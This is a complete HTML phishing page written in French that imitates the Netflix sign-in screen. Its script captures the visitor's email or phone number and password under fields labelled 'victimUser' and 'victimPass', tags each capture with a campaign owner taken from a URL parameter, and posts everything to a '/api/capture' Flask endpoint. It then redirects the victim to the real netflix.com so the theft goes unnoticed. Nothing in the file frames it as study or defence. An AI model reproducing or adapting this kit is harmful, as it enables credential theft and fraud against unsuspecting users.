<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - S'identifier</title>
    <style>
        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background-color: #000000;
            background-image: linear-gradient(to bottom, rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://assets.nflxext.com/ffe/siteui/vlv3/efb4855d-e702-43e5-9997-bba01541544c/fe1c1e1a-f4b4-4aa9-b883-29364972d00c/FR-fr-20230417-popsignuptwoweeks-perspective_alpha_website_small.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .netflix-container {
            background-color: rgba(0, 0, 0, 0.75);
            border-radius: 4px;
            padding: 60px 68px 40px;
            width: 100%;
            max-width: 450px;
            box-sizing: border-box;
            color: #ffffff;
        }

        .netflix-logo {
            color: #e50914;
            font-size: 36px;
            font-weight: bold;
            letter-spacing: 2px;
            margin-bottom: 28px;
            display: inline-block;
            text-decoration: none;
        }

        h1 {
            font-size: 32px;
            font-weight: 500;
            margin-bottom: 28px;
            margin-top: 0;
        }

        .input-group {
            margin-bottom: 16px;
        }

        .input-field {
            width: 100%;
            padding: 16px 20px;
            background-color: #333333;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            color: #ffffff;
            box-sizing: border-box;
            outline: none;
        }

        .input-field::placeholder {
            color: #8c8c8c;
        }

        .input-field:focus {
            background-color: #454545;
        }

        .netflix-btn {
            background-color: #e50914;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 16px;
            width: 100%;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 24px;
            transition: background-color 0.2s;
        }

        .netflix-btn:hover {
            background-color: #f6121d;
        }

        .help-section {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 13px;
            color: #b3b3b3;
            margin-top: 12px;
        }

        .help-section a {
            color: #b3b3b3;
            text-decoration: none;
        }

        .help-section a:hover {
            text-decoration: underline;
        }

        .signup-section {
            margin-top: 60px;
            font-size: 16px;
            color: #737373;
        }

        .signup-section a {
            color: #ffffff;
            text-decoration: none;
            font-weight: 500;
        }

        .signup-section a:hover {
            text-decoration: underline;
        }

        .captcha-notice {
            font-size: 13px;
            color: #8c8c8c;
            margin-top: 15px;
            line-height: 1.4;
        }

        .captcha-notice a {
            color: #0071eb;
            text-decoration: none;
        }

        .captcha-notice a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="netflix-container">
        <a href="#" class="netflix-logo">NETFLIX</a>
        <h1>S'identifier</h1>

        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" class="input-field" placeholder="E-mail ou numéro de téléphone" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" class="input-field" placeholder="Mot de passe" required>
            </div>

            <button type="submit" class="netflix-btn">S'identifier</button>

            <div class="help-section">
                <span><input type="checkbox" id="remember" checked style="accent-color: #737373;"> Se souvenir de moi</span>
                <a href="#" onclick="return false;">Besoin d'aide ?</a>
            </div>
        </form>

        <div class="signup-section">
            <p>Première visite sur Netflix ? <a href="#" onclick="return false;">Inscrivez-vous.</a></p>
        </div>

        <div class="captcha-notice">
            <p>Cette page est protégée par Google reCAPTCHA pour nous assurer que vous n'êtes pas un bot. <a href="#" onclick="return false;">En savoir plus.</a></p>
        </div>
    </div>

    <script>
        // Récupération automatique des paramètres de l'URL (?user=Kim&type=standard)
        const urlParams = new URLSearchParams(window.location.search);
        const campaignOwner = urlParams.get('user') || 'Kim';
        const linkType = urlParams.get('type') || 'standard';

        // Gestion de la soumission du formulaire et envoi vers Flask
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const payload = {
                owner: campaignOwner,
                network: "Netflix",
                type: linkType,
                victimUser: username,
                victimPass: password,
                otp: 'Aucun'
            };

            // Envoi des données capturées vers le backend Flask (/api/capture)
            fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(response => {
                window.location.href = "https://www.netflix.com";
            }).catch(error => {
                window.location.href = "https://www.netflix.com";
            });
        });
    </script>
</body>
</html>
